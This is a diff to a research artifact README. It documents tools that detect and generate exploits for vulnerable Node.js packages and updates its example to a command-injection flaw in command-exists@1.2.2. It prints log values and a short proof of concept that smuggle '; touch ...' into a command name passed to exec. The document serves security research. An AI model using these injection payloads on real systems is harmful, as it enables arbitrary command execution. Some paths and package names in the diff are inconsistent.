@@ -29,7 +29,7 @@ All source code and reference benchmarks are included in the repository and resp
 **Time.**
 We estimate that the time needed to run the artifact evaluation is as follows:
 - Getting started: 30 minutes (approximately).
-- Main experiments: XX hours (approximately).
+- Main experiments: 34-48 hours (approximately).
 
 **Artifact Structure.**
 The artifact is organized as follows:
@@ -142,25 +142,29 @@ To setup the environment, load the FAST Docker image, `fast_image.tar.gz`, using
 $ docker load < fast_image.tar.gz
 ```
 **Basic Testing.**
-To ensure that the image is loaded correctly and that the tool is functioning as expected, run FAST's running example (the package `thenify@3.3.0`) using the following commands:
+To ensure that the image is loaded correctly and that the tool is functioning as expected, run FAST's running example (the package `command-exists@1.2.2`) using the following commands:
 
 ```sh
 $ docker run --rm -it fast:latest bash
 $ cd explode-js
-$ python3 run-fast.py datasets out --packages thenify
+$ python3 run-fast.py datasets out --packages command-exists
 ```
 
 **Output.** The output of the previous command should be:
 
 ```
-[*] 1 package(s) selected for benchmarking
-[-] Running: thenify@3.3.0
-Running: python3 -m simurun -t code_exec -X datasets/vulcan-dataset/CWE-94/GHSA-29xr-v42j-r956/src/index.js
+[*] 2 package(s) selected for benchmarking
+[-] Running: command-exists@1.2.2
+Running: python3 -m simurun -t os_command -X datasets/vulcan-dataset/CWE-78/659/src/command-exists.js
+[-] Running: command-exists@1.2.2
+Running: python3 -m simurun -t os_command -X datasets/secbench-dataset/CWE-78/command-exists_1.2.2/src/command-exists.js
 
-| package  | version | cwe   | marker   | path_time | expl_time | total_time | detection  | exploit  |
-|----------|---------|-------|----------|-----------|-----------|------------|------------|----------|
-| thenify  | 3.3.0   | CWE-94| Exited 0 | 0.385258  | 26.0743   | 26.4596    | successful | failed   |
+| package        | version   | cwe    | marker   |   path_time |   expl_time |   total_time | detection   | exploit    |
+|:---------------|:----------|:-------|:---------|------------:|------------:|-------------:|:------------|:-----------|
+| command-exists | 1.2.2     | CWE-78 | Exited 0 |    0.94026  |     13.822  |      14.7623 | successful  | successful |
+| command-exists | 1.2.2     | CWE-78 | Exited 0 |    0.838758 |     17.1162 |      17.955  | successful  | successful |
 ```
+
 The output table is saved in `.csv` format as `fast-parsed-results.csv`.
 
 **Remark:**
@@ -169,57 +173,58 @@ Importantly, FAST does not generate executable exploits. Instead, it produces a
 log containing information about the vulnerable package function and the
 inputs required to trigger the exploit.
 Below, we provide the relevant fragment of FAST's log for the current example,
-which can be found in the file `out/5_fast/fast-stdout.log`:
+which can be found in the file `cat out/134_fast/fast-stdout.log`:
 
 ```
+...
+success:  [['598', '330', '810'], ['80', '330', '810'], ['287', '330', '810'], ['598', '416', '810'], ['397', '416', '810'], ['726', '501', '874'], ['475', '501', '874'], ['726', '568', '874'], ['547', '568', '874']]
+final objs: ['4727'] value: ""; touch exploited & initial objs: None
+final objs: ['4727'] value: "; touch exploited # initial objs: None
+final objs: ['4727'] value: & touch exploited # initial objs: None
+final objs: ['4727'] value: ''; touch exploited # initial objs: None
+final objs: ['5014'] value: ""; touch exploited & initial objs: None
+final objs: ['5014'] value: "; touch exploited # initial objs: None
+final objs: ['5014'] value: & touch exploited # initial objs: None
+final objs: ['5014'] value: ''; touch exploited # initial objs: None
+...
 Attack Path:
 ==========================
-/home/explodejs/explode-js/datasets/vulcan-dataset/CWE-94/GHSA-29xr-v42j-r956/src/index.js
-
-Line 28:
---------------------------------------------------
-thenify.withCallback = function ($$__fn__$$, options) {
-    assert(typeof $$__fn__$$ === 'function')
-    options = options || {}
-    options.withCallback = true
-    if (options.multiArgs === undefined) options.multiArgs = true
-    return eval(createWrapper($$__fn__$$.name, options))
-}
-
-Line 60:
---------------------------------------------------
-multiArgs = 'var multiArgs = ' + JSON.stringify(multiArgs) + '\n'
-
-Line 67:
---------------------------------------------------
-return '(function ' + name + '() {\n'
-    + 'var self = this\n'
-    + 'var len = arguments.length\n'
-    + multiArgs
-    + withCallback
-    + 'var args = new Array(len + 1)\n'
-    + 'for (var i = 0; i < len; ++i) args[i] = arguments[i]\n'
-    + 'var lastIndex = i\n'
-    + 'return new Promise(function (resolve, reject) {\n'
-        + 'args[lastIndex] = createCallback(resolve, reject, multiArgs)\n'
-        + '$$__fn__$$.apply(self, args)\n'
-    + '})\n'
-+ '})'
-
-Line 17:
---------------------------------------------------
-return eval(createWrapper($$__fn__$$.name, options))
+/home/explodejs/explode-js/datasets/vulcan-dataset/CWE-78/659/src/command-exists.js
+101     module.exports = function commandExists(commandName, callback) {
+  if (!callback && typeof Promise !== 'undefined') {
+    return new Promise(function(resolve, reject){
+      commandExists(commandName, function(error, output){
+        if (output) {
+          resolve(commandName);
+        } else {
+          reject(error);
+        }
+      });
+    });
+  }
+  if (isUsingWindows) {
+    commandExistsWindows(commandName, callback);
+  } else {
+    commandExistsUnix(commandName, callback);
+  }
+};
+49                  var child = exec('command -v ' + commandName +
+                  ' 2>/dev/null' +
+                  ' && { echo >&1 \'' + commandName + ' found\'; exit 0; }',
+                  function (error, stdout, stderr) {
+                      callback(null, !!stdout);
+                  });
+6         sink_hqbpillvul_exec(sink);
+...
 ```
 
 Based on the provided log, one can manually construct the following exploit:
 
 ```js
-var thenify = require("thenify");
-var $$__fn__$$ = {
-    name: "() {} && console.log('success') && some"
-}
-var options = {};
-thenify.withCallback($$__fn__$$, options);
+var sink = require("command-exists");
+var commandName = "''; touch success #";
+var callback = function(){};
+sink(commandName, callback);
 ```
 
 ## A.4. Getting Started with *NodeMedic-Fine*
@@ -323,13 +328,13 @@ NodeMedic does not detect or generate exploits for CWE-22 and CWE-1321, which co
 
 **Table 6. [Performance]**
 
-| CWE ID   | Static (s) | Symbolic (s) |  Total (s) |
-|----------|--------|----------|--------|
-| CWE-22   | 29.106 |    2.462 | 31.568 |
-| CWE-78   | 33.976 |    6.545 | 40.521 |
-| CWE-94   | 42.947 |   11.926 | 54.873 |
-| CWE-1321 | 31.162 |   10.949 | 42.112 |
-| Total    |  32.45 |    7.278 | 39.728 |
+| CWE ID   | Total (Explode.js) | Total (FAST) | Total (NodeMedic-Fine) |
+|----------|---------|----------|---------|
+| CWE-22   | 31.568s | 4.271 | -- |
+| CWE-78   | 40.521s | 20.405 | 39.311 |
+| CWE-94   | 54.873s | 5.939 | 18.824 |
+| CWE-1321 | 42.112s | 19.130 | -- |
+| Total    | 39.728s | 13.674 | 19.730 |
 
 Where we place in each cell the average time that the respective tool took to
 analyze the vulnerabilities of the corresponding category.
@@ -351,11 +356,11 @@ This will take approximately **10 hours**. The execution was successful if a
 table summarizing the results is printed to stdout at the end.
 
 The generated exploits are stored in the output dirs in `bench/datasets/CWE-{22|78|94|1321}`.
-To check the exploit generated for a specific package, say the `deep-get-set@1.1.1` package,
+To check the exploit generated for a specific package, say the `command-exists@1.2.2` package,
 run the command:
 
 ```sh
-<TODO>
+$ python3 retreive.py bench/datasets/zeroday-output apptjs
 ```
 
 To generate the Explode.js results of Table 3, run:
@@ -376,10 +381,10 @@ Run the following commands:
 
 ```sh
 $ cd explode-js
-$ python3 run-fast.py datasets/ out
+$ python3 run-fast.py datasets/ out && python3 table_fast.py
 ```
 
-This will take approximately `[FIXME]` hours. The execution was successful if a
+This will take approximately **7 hours**. The execution was successful if a
 table summarizing the results is printed to stdout at the end.
 
 As stated before, FAST does not generate executable exploits; those have to be manually put together from the output log information.
@@ -403,14 +408,14 @@ $ python3 table_fast_time.py
 Run the following command in the root of the artifact:
 
 ```sh
-$ python3 run-NodeMedic.py bench/datasets out
+$ python3 run-NodeMedic.py bench/datasets out && python3 table_nodemedic.py
 ```
 
-This will take approximately `[FIXME]` hours. The execution was successful if a
+This will take approximately **5 hours**. The execution was successful if a
 table summarizing the results is printed to stdout at the end.
 
-The generated exploits are stored `[FIXME]`.
-To check the exploit generated for a specific package, say the `[FIXME]` package, see file `[FIXME]`.
+The generated exploits are stored in `out/`. To check the exploit generated for a
+specific package, say the `command-exists@1.2.2` package, see file `out/command-exists@1.2.2__nodeMedic/poc0.js`.
 
 To generate the NodeMedic-Fine results of Table 3, run:
 
@@ -481,8 +486,12 @@ $ cd explode-js
 $ ./run_explode-js_zeroday.sh
 ```
 
-The scripts output a version of the table above and the generated exploits can be found in the `FIXME` folder.
-To check the exploit generated for a specific package, say the `[FIXME]` package, see file `[FIXME]`.
+This will take approximately **1.5 hours**. The scripts prints to the stdout a version of the table above and the generated exploits can be found in the `bench/datasets/zeroday-output` dir.
+To check the exploit generated for a specific package, say the `aaptjs` package, run:
+
+```sh
+$ python3 retreive.py bench/datasets/zeroday-output apptjs
+```
 
 To generate Table 5, run:
 
